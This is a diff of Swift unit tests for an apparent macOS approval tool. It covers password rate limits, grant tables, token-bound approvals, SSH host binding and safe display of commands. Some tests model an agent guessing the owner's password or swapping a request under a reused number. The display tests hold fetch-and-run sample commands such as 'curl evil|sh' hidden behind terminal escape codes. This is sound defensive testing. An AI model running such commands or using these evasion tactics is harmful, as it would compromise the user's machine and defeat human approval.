@@ -33,22 +33,27 @@ final class TerminalApprovalPolicyTests: XCTestCase {
         XCTAssertNotNil(TerminalApproval.refusal(controllingTTY: "ttys004", stdinPath: "/tmp/pw.txt"))
     }
 
+    func fail(_ s: inout TerminalApprovalState, at t: Date) {
+        s.beginAttempt(now: t)
+        s.finishAttempt(ok: false, now: t)
+    }
+
     func testLimiterBacksOffThenTurnsOff() {
         let t0 = Date(timeIntervalSince1970: 1_000_000)
         var s = TerminalApprovalState()
         XCTAssertNotNil(s.refusal(now: t0), "off until turned on with Touch ID")
         s.turnOn()
         XCTAssertNil(s.refusal(now: t0))
-        for i in 0..<4 { s.recordFailure(now: t0.addingTimeInterval(Double(i))) }
+        for i in 0..<4 { fail(&s, at: t0.addingTimeInterval(Double(i))) }
         XCTAssertNil(s.refusal(now: t0.addingTimeInterval(5)))
         XCTAssertEqual(s.attemptsLeft(now: t0.addingTimeInterval(5)), 1)
-        s.recordFailure(now: t0.addingTimeInterval(5))
+        fail(&s, at: t0.addingTimeInterval(5))
         XCTAssertTrue(s.refusal(now: t0.addingTimeInterval(6))?.contains("try again in") == true)
         XCTAssertNil(s.refusal(now: t0.addingTimeInterval(16 * 60)), "short lock ends after 15 min")
         XCTAssertTrue(s.enabled)
 
         // Ten wrong passwords within a day switch terminal approvals off until Touch ID.
-        for i in 0..<5 { s.recordFailure(now: t0.addingTimeInterval(3600 + Double(i))) }
+        for i in 0..<5 { fail(&s, at: t0.addingTimeInterval(3600 + Double(i))) }
         XCTAssertFalse(s.enabled)
         XCTAssertNotNil(s.disabledReason)
         XCTAssertTrue(s.refusal(now: t0.addingTimeInterval(7200))!.contains("Touch ID"))
@@ -57,21 +62,48 @@ final class TerminalApprovalPolicyTests: XCTestCase {
         XCTAssertNil(s.disabledReason)
     }
 
-    func testSuccessClearsFailuresAndOldFailuresAge() {
+    func testACorrectPasswordDoesNotWipeTheDailyCount() {
         let t0 = Date(timeIntervalSince1970: 2_000_000)
         var s = TerminalApprovalState(enabled: true)
-        for i in 0..<4 { s.recordFailure(now: t0.addingTimeInterval(Double(i))) }
-        s.recordSuccess()
-        XCTAssertEqual(s.attemptsLeft(now: t0), TerminalApprovalState.shortLimit)
-        for i in 0..<9 { s.recordFailure(now: t0.addingTimeInterval(Double(i) * 1000)) }
-        XCTAssertTrue(s.enabled)
-        s.recordFailure(now: t0.addingTimeInterval(30 * 3600)) // the first nine are over a day old by now
-        XCTAssertTrue(s.enabled)
+        // An agent guesses between the owner's approvals: the guesses still add up and are reported.
+        for round in 0..<3 {
+            let base = t0.addingTimeInterval(Double(round) * 3600)
+            for i in 0..<3 { fail(&s, at: base.addingTimeInterval(Double(i))) }
+            s.beginAttempt(now: base.addingTimeInterval(10))
+            XCTAssertEqual(s.finishAttempt(ok: true, now: base.addingTimeInterval(10)), 3, "owner is told")
+        }
+        XCTAssertEqual(s.failures.count, 9)
+        XCTAssertEqual(s.failuresSinceSuccess(now: t0.addingTimeInterval(3 * 3600)), 0)
+        fail(&s, at: t0.addingTimeInterval(3 * 3600))
+        XCTAssertFalse(s.enabled, "10 in 24 h, whatever successes came between")
+        // A day later the old failures no longer count.
+        var later = TerminalApprovalState(enabled: true)
+        for i in 0..<9 { fail(&later, at: t0.addingTimeInterval(Double(i) * 1000)) }
+        fail(&later, at: t0.addingTimeInterval(30 * 3600))
+        XCTAssertTrue(later.enabled)
+    }
+
+    func testAnAttemptThatNeverFinishesCounts() {
+        let t0 = Date(timeIntervalSince1970: 2_500_000)
+        var s = TerminalApprovalState(enabled: true)
+        for i in 0..<5 { s.beginAttempt(now: t0.addingTimeInterval(Double(i))) } // e.g. Sx.app killed mid-check, each time
+        XCTAssertNotNil(s.refusal(now: t0.addingTimeInterval(6)))
+        s.beginAttempt(now: t0.addingTimeInterval(7))
+        s.finishAttempt(ok: true, now: t0.addingTimeInterval(7))
+        XCTAssertEqual(s.failures.count, 5, "only the finished attempt is cleared")
+    }
+
+    func testTurningOffKeepsItOff() {
+        var s = TerminalApprovalState(enabled: true)
+        s.turnOff()
+        s.beginAttempt()
+        s.finishAttempt(ok: true)
+        XCTAssertFalse(s.enabled, "a correct password never turns approvals back on")
     }
 
     func testStateRoundTripsThroughWire() throws {
         var s = TerminalApprovalState(enabled: true)
-        s.recordFailure(now: Date(timeIntervalSince1970: 3_000_000))
+        fail(&s, at: Date(timeIntervalSince1970: 3_000_000))
         XCTAssertEqual(try Wire.decode(TerminalApprovalState.self, from: Wire.encode(s)), s)
     }
 }
@@ -102,6 +134,25 @@ final class GrantTableTests: XCTestCase {
         XCTAssertTrue(t.active(now: now).isEmpty)
     }
 
+    func testAddingKeepsTheWiderGrant() {
+        var t = GrantTable()
+        t.add(key: "eeeeeeee5555", info: info(7200))
+        t.add(key: "eeeeeeee5555", info: info(600), uses: 1)
+        XCTAssertEqual(t.active(now: now).first?.until, now.addingTimeInterval(7200))
+        XCTAssertNil(t.active(now: now).first?.usesLeft, "unlimited stays unlimited")
+        XCTAssertTrue(t.take("eeeeeeee5555", now: now))
+        XCTAssertTrue(t.take("eeeeeeee5555", now: now))
+    }
+
+    func testSingleUseGrantsHaveTheirOwnKeyAndID() {
+        var t = GrantTable()
+        let once = GrantTable.onceKey("ffffffff6666")
+        t.add(key: once, info: info(900), uses: 1)
+        XCTAssertFalse(t.take("ffffffff6666", now: now), "a retry approval is not a timed grant")
+        XCTAssertEqual(t.active(now: now).first?.id, "1fffffff")
+        XCTAssertEqual(t.revoke(prefix: "1fff"), 1)
+    }
+
     func testRevokeByShortIDNeedsFourCharacters() {
         var t = GrantTable()
         t.add(key: "cccccccc3333", info: info(3600))
@@ -124,10 +175,34 @@ final class PendingTableTests: XCTestCase {
                     hostKey: "SHA256:x", prod: prod, terminal: terminal, canGrant: !prod)
     }
 
+    func tok(_ t: PendingTable, _ id: Int) -> String { t.entry(id)?.info.token ?? "" }
+
+    func testApprovalIsBoundToTheTokenNotJustTheNumber() {
+        var t = PendingTable()
+        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
+        let shown = t.entry(id)!.info.token
+        XCTAssertFalse(shown.isEmpty)
+        XCTAssertEqual(t.pick(id, token: shown, now: now), .success(.waiting))
+        XCTAssertNotEqual(t.pick(id, token: "", now: now), .success(.waiting))
+        // Sx.app restarts: numbering starts over, an agent makes a request that gets the same number.
+        var restarted = PendingTable()
+        let swapped = restarted.add(info(), classKey: "evil", wideKey: nil, now: now)!
+        XCTAssertEqual(swapped, id)
+        if case .success = restarted.pick(swapped, token: shown, now: now) { XCTFail("old token must not approve the new request") }
+    }
+
+    func testAFloodIsCapped() {
+        var t = PendingTable()
+        for i in 0..<PendingTable.maxWaiting { XCTAssertNotNil(t.add(info(), classKey: "k\(i)", wideKey: nil, now: now)) }
+        XCTAssertNil(t.add(info(), classKey: "more", wideKey: nil, now: now))
+        t.end(1, state: PendingInfo.State.expired, now: now)
+        XCTAssertNotNil(t.add(info(), classKey: "again", wideKey: nil, now: now), "finished ones free a slot")
+    }
+
     func testIdsAreSequentialAndListed() {
         var t = PendingTable()
-        let a = t.add(info(), classKey: "k1", wideKey: "w1", now: now)
-        let b = t.add(info(), classKey: "k2", wideKey: nil, now: now)
+        let a = t.add(info(), classKey: "k1", wideKey: "w1", now: now)!
+        let b = t.add(info(), classKey: "k2", wideKey: nil, now: now)!
         XCTAssertEqual([a, b], [1, 2])
         XCTAssertEqual(t.list(now: now).map(\.id), [1, 2])
         XCTAssertEqual(t.list(now: now).first?.state, PendingInfo.State.waiting)
@@ -135,42 +210,52 @@ final class PendingTableTests: XCTestCase {
 
     func testWaitingThenApprovedLive() {
         var t = PendingTable()
-        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)
-        XCTAssertEqual(t.pick(id, now: now), .success(.waiting))
+        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
+        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now), .success(.waiting))
         t.approveLive(id)
         XCTAssertTrue(t.entry(id)!.approvedInTerminal)
-        XCTAssertEqual(t.pick(id, now: now), .failure(.init("#\(id): already approved")))
+        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now), .failure(.init("#\(id): already approved")))
     }
 
     func testExpiredStaysApprovableForAWhile() {
         var t = PendingTable()
-        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)
+        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
         t.end(id, state: PendingInfo.State.expired, now: now)
-        XCTAssertEqual(t.pick(id, now: now.addingTimeInterval(60)), .success(.expired))
+        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now.addingTimeInterval(60)), .success(.expired))
         t.markApprovedAfterExpiry(id)
-        if case .success = t.pick(id, now: now.addingTimeInterval(61)) { XCTFail("approved twice") }
+        if case .success = t.pick(id, token: tok(t, id), now: now.addingTimeInterval(61)) { XCTFail("approved twice") }
 
-        let late = t.add(info(), classKey: "k2", wideKey: nil, now: now)
+        let late = t.add(info(), classKey: "k2", wideKey: nil, now: now)!
         t.end(late, state: PendingInfo.State.expired, now: now)
-        if case .success = t.pick(late, now: now.addingTimeInterval(TerminalApproval.keepExpired + 1)) { XCTFail("too old") }
+        if case .success = t.pick(late, token: tok(t, late), now: now.addingTimeInterval(TerminalApproval.keepExpired + 1)) { XCTFail("too old") }
         t.prune(now: now.addingTimeInterval(TerminalApproval.keepExpired + 1))
         XCTAssertNil(t.entry(late))
         XCTAssertTrue(t.list(now: now.addingTimeInterval(TerminalApproval.keepExpired + 1)).isEmpty)
     }
 
+    func testUnverifiedRequestsAreApprovableOnlyWhileTheyWait() {
+        var t = PendingTable()
+        var unverified = info()
+        unverified.retryable = false
+        let id = t.add(unverified, classKey: "once-only", wideKey: nil, now: now)!
+        XCTAssertEqual(t.pick(id, token: tok(t, id), now: now), .success(.waiting))
+        t.end(id, state: PendingInfo.State.expired, now: now)
+        if case .success = t.pick(id, token: tok(t, id), now: now) { XCTFail("nothing its retry could match") }
+    }
+
     func testDeniedAndTouchIDOnlyAreNotApprovable() {
         var t = PendingTable()
-        let denied = t.add(info(), classKey: "k", wideKey: nil, now: now)
+        let denied = t.add(info(), classKey: "k", wideKey: nil, now: now)!
         t.end(denied, state: PendingInfo.State.denied, now: now)
-        XCTAssertEqual(t.pick(denied, now: now), .failure(.init("#\(denied): already denied")))
-        let other = t.add(info(terminal: false), classKey: "k2", wideKey: nil, now: now)
-        if case .success = t.pick(other, now: now) { XCTFail("Touch ID only") }
-        if case .success = t.pick(99, now: now) { XCTFail("no such id") }
+        XCTAssertEqual(t.pick(denied, token: tok(t, denied), now: now), .failure(.init("#\(denied): already denied")))
+        let other = t.add(info(terminal: false), classKey: "k2", wideKey: nil, now: now)!
+        if case .success = t.pick(other, token: tok(t, other), now: now) { XCTFail("Touch ID only") }
+        if case .success = t.pick(99, token: tok(t, 99), now: now) { XCTFail("no such id") }
     }
 
     func testEndOnlyMovesWaitingRequests() {
         var t = PendingTable()
-        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)
+        let id = t.add(info(), classKey: "k", wideKey: nil, now: now)!
         t.end(id, state: PendingInfo.State.approved, now: now)
         t.end(id, state: PendingInfo.State.expired, now: now)
         XCTAssertEqual(t.entry(id)?.info.state, PendingInfo.State.approved)
@@ -318,10 +403,12 @@ final class SSHHostBindingTests: XCTestCase {
         w.string(method)
         w.byte(1)
         w.string("ssh-ed25519")
-        w.string([9, 9, 9])
+        w.string(userKey)
         if let hostKey { w.string(hostKey) }
         return w.data
     }
+
+    let userKey: [UInt8] = [9, 9, 9]
 
     func testSignRequestIsTiedToTheBoundServer() {
         let host = ed25519Host()
@@ -329,18 +416,37 @@ final class SSHHostBindingTests: XCTestCase {
         let bind = SSHHostBinding(hostKey: host.blob, sessionID: sid, signature: host.sign(sid), isForwarding: false)
 
         XCTAssertEqual(SSHUserAuthRequest(payload: userAuth(sid))?.user, "git")
-        XCTAssertEqual(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [bind]), bind)
+        XCTAssertEqual(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [bind], key: userKey), bind)
         XCTAssertEqual(SSHUserAuthRequest.boundHost(payload: userAuth(sid, method: "publickey-hostbound-v00@openssh.com", hostKey: host.blob),
-                                                    bindings: [bind]), bind)
+                                                    bindings: [bind], key: userKey), bind)
         // Another session, a host-bound request naming another server, a forwarded agent, no binding at all.
-        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(Array(repeating: 8, count: 32)), bindings: [bind]))
+        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(Array(repeating: 8, count: 32)), bindings: [bind], key: userKey))
         XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid, method: "publickey-hostbound-v00@openssh.com", hostKey: ed25519Host().blob),
-                                                  bindings: [bind]))
+                                                  bindings: [bind], key: userKey))
         let hop = SSHHostBinding(hostKey: host.blob, sessionID: sid, signature: host.sign(sid), isForwarding: true)
-        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [bind, hop]))
-        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: []))
+        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [hop, bind], key: userKey))
+        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [], key: userKey))
+        // A login for the bound session, but with another key than the one asked to sign.
+        XCTAssertNil(SSHUserAuthRequest.boundHost(payload: userAuth(sid), bindings: [bind], key: [1, 2, 3]))
         // Not a login at all (e.g. `ssh-keygen -Y sign` data).
         XCTAssertNil(SSHUserAuthRequest(payload: Data("SSHSIG-blob".utf8)))
+    }
+
+    func testSignedDataNamespace() {
+        var w = SSHWriter()
+        w.string("git")
+        w.string("")
+        w.string("sha512")
+        w.string(Array(repeating: 1, count: 64))
+        XCTAssertEqual(SSHSignedData.namespace(Data("SSHSIG".utf8) + w.data), "git")
+        XCTAssertNil(SSHSignedData.namespace(w.data), "no magic")
+        XCTAssertNil(SSHSignedData.namespace(Data("SSHSIG".utf8) + w.data + Data([0])), "trailing bytes")
+    }
+
+    func testSHA1HostSignaturesAreRefused() throws {
+        let key = try SSHPrivateKey(openSSH: keygen("rsa", bits: 2048))
+        let sid = Data(SHA256.hash(data: Data("sha1".utf8)))
+        XCTAssertFalse(SSHSignatureVerifier.verify(publicKeyBlob: Array(key.publicBlob), signatureBlob: Array(try key.sign(sid, flags: 0)), data: sid))
     }
 }
 
@@ -381,5 +487,27 @@ final class ProcessInspectionTests: XCTestCase {
         XCTAssertEqual(pipe(&fds), 0)
         defer { close(fds[0]); close(fds[1]) }
         XCTAssertNil(AgentDetect.descriptorPath(of: getpid(), fd: fds[0]), "a pipe is not a file or terminal")
+    }
+}
+
+final class DisplayTextTests: XCTestCase {
+    func testControlAndInvisibleCharactersAreEscaped() {
+        XCTAssertEqual(DisplayText.safe("npm test"), "npm test")
+        XCTAssertEqual(DisplayText.safe("~/Developer/проєкт"), "~/Developer/проєкт", "ordinary Unicode stays")
+        let esc = DisplayText.safe("curl evil|sh\u{1B}[2K\r npm test")
+        XCTAssertFalse(esc.unicodeScalars.contains { $0.value == 0x1B || $0.value == 0x0D })
+        XCTAssertTrue(esc.contains("\\u{1b}") && esc.contains("\\u{d}"))
+        XCTAssertTrue(DisplayText.safe("a\u{202E}b").contains("\\u{202e}"), "bidi override")
+        XCTAssertTrue(DisplayText.safe("a\u{200B}b").contains("\\u{200b}"), "zero-width space")
+        XCTAssertTrue(DisplayText.safe("a\u{9B}b").contains("\\u{9b}"), "C1 CSI")
+        XCTAssertEqual(DisplayText.safe("a\\u{1b}"), "a\\\\u{1b}", "a literal backslash cannot fake an escape")
+    }
+
+    func testShellQuotingSeparatesArguments() {
+        XCTAssertEqual(DisplayText.shellQuoted(["npm", "test"]), "npm test")
+        XCTAssertEqual(DisplayText.shellQuoted(["npm test"]), "'npm test'")
+        XCTAssertEqual(DisplayText.shellQuoted(["sh", "-c", "curl x | sh"]), "sh -c 'curl x | sh'")
+        XCTAssertEqual(DisplayText.shellQuoted(["echo", "it's"]), "echo 'it'\\''s'")
+        XCTAssertEqual(DisplayText.shellQuoted([""]), "''")
     }
 }
